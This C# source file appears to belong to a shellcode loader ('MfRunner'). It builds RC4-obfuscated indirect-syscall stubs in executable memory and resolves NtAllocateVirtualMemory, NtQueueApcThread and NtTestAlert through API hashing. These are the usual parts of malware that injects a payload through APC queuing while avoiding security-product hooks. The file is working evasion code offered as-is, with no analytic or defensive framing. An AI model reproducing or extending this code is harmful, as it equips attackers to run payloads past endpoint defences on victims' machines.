using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace MfRunner
{
#if NATIVE
    internal partial class Program
    {
        public static Delegate GetSyscallFn<T>(short syscallNumber, IntPtr syscallAddr)
        {
#if X64
            // mov r10, rcx
            // mov eax, syscall_number
            // movabs r11, syscall_addr
            // jmp r11

            byte[] X64_SYSCALL_STUB = new byte[] { 76, 139, 209, 184, 0, 0, 0, 0, 73, 187, 0, 0, 0, 0, 0, 0, 0, 0, 65, 255, 227 };
            ApplyRC4(X64_SYSCALL_STUB, DeriveKey(SEED_SYSCALL_STUB));

            byte[] syscallNumberBytes = BitConverter.GetBytes(syscallNumber);
            syscallNumberBytes.CopyTo(X64_SYSCALL_STUB, 4);
            long syscallAddressLong = (long)syscallAddr;
            byte[] syscallAddressBytes = BitConverter.GetBytes(syscallAddressLong);
            syscallAddressBytes.CopyTo(X64_SYSCALL_STUB, 10);

            IntPtr allocatedMemory = CustomVirtualAlloc(IntPtr.Zero, (uint)X64_SYSCALL_STUB.Length, 0x00003000, 0x40);
            CopyFunction(allocatedMemory, X64_SYSCALL_STUB);

            for (int i = 0; i < X64_SYSCALL_STUB.Length; i++) X64_SYSCALL_STUB[i] = 0;
#else
            // mov eax, syscall_number
            // mov ebx, syscall_addr
            // jmp ebx

            byte[] X86_SYSCALL_STUB = new byte[] { 184, 0, 0, 0, 0, 187, 0, 0, 0, 0, 255, 227 };
            ApplyRC4(X86_SYSCALL_STUB, DeriveKey(SEED_SYSCALL_STUB));

            byte[] syscallNumberBytes = BitConverter.GetBytes(syscallNumber);
            syscallNumberBytes.CopyTo(X86_SYSCALL_STUB, 1);
            int syscallAddressInt = (int)syscallAddr;
            byte[] syscallAddressBytes = BitConverter.GetBytes(syscallAddressInt);
            syscallAddressBytes.CopyTo(X86_SYSCALL_STUB, 6);

            IntPtr allocatedMemory = CustomVirtualAlloc(IntPtr.Zero, (uint)X86_SYSCALL_STUB.Length, 0x00003000, 0x40);
            CopyFunction(allocatedMemory, X86_SYSCALL_STUB);

            for (int i = 0; i < X86_SYSCALL_STUB.Length; i++) X86_SYSCALL_STUB[i] = 0;
#endif
            return Marshal.GetDelegateForFunctionPointer(allocatedMemory, typeof(T));
        }

        static NtAllocateVirtualMemoryType CustomNtAllocateVirtualMemory;
        static NtQueueApcThreadType        CustomNtQueueApcThread;
        static NtTestAlertType             CustomNtTestAlert;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtAllocateVirtualMemoryType(IntPtr P1, ref IntPtr P2, uint P3, ref uint P4, uint P5, uint P6);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtQueueApcThreadType(IntPtr P1, IntPtr P2, IntPtr P3, IntPtr P4, ulong P5);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        public delegate uint NtTestAlertType();

        public static void InitializeIndirectSyscalls()
        {
#if X64
            int syscallInstructionOffset = 0x12;
#else
            int syscallInstructionOffset = 0x05;
#endif

            uint   NtAllocateVirtualMemoryHash = 0xDC8E027C; // NtAllocateVirtualMemory
            short  NtAllocateVirtualMemorySSN  = GetNtdllSSN(NtAllocateVirtualMemoryHash);
            IntPtr NtAllocateVirtualMemorySA   = GetExportAddress(NtdllAddress, NtAllocateVirtualMemoryHash) + syscallInstructionOffset;

            uint   NtQueueApcThreadHash        = 0xB30AC50E; // NtQueueApcThread
            short  NtQueueApcThreadSSN         = GetNtdllSSN(NtQueueApcThreadHash);
            IntPtr NtQueueApcThreadSA          = GetExportAddress(NtdllAddress, NtQueueApcThreadHash) + syscallInstructionOffset;

            uint   NtTestAlertHash             = 0xB6D480AF; // NtTestAlert
            short  NtTestAlertSSN              = GetNtdllSSN(NtTestAlertHash);
            IntPtr NtTestAlertSA               = GetExportAddress(NtdllAddress, NtTestAlertHash) + syscallInstructionOffset;

            CustomNtAllocateVirtualMemory = (NtAllocateVirtualMemoryType) GetSyscallFn<NtAllocateVirtualMemoryType>(NtAllocateVirtualMemorySSN, NtAllocateVirtualMemorySA);
            CustomNtQueueApcThread        = (NtQueueApcThreadType)        GetSyscallFn<NtQueueApcThreadType>(NtQueueApcThreadSSN, NtQueueApcThreadSA);
            CustomNtTestAlert             = (NtTestAlertType)             GetSyscallFn<NtTestAlertType>(NtTestAlertSSN, NtTestAlertSA);
        }
    }
#endif
}
